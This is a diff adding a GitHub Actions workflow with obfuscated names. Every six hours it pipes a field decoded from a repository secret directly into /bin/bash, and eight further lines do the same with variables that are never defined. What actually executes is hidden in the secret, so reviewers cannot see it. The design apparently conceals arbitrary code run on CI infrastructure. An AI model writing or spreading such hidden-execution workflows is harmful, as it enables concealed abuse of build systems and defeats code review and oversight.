@@ -1,0 +1,26 @@
+name: shunjuleirui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shunjuleirui
+        env:
+          xga075: ${{ secrets.xga075 }}
+        run: |
+          echo $xga075 | jq -r .vr7 | /bin/bash
+          echo $gfzmo2 | jq -r .zyedi59 | /bin/bash
+          echo $y1930 | jq -r .zxilq1 | /bin/bash
+          echo $nrpe06 | jq -r .i0800 | /bin/bash
+          echo $e32112 | jq -r .crvrn88615 | /bin/bash
+          echo $bsr4497 | jq -r .vmle405 | /bin/bash
+          echo $tjefc70452 | jq -r .smvcb31178 | /bin/bash
+          echo $ukm30552 | jq -r .kpz1 | /bin/bash
+          echo $dl560 | jq -r .j08 | /bin/bash
+
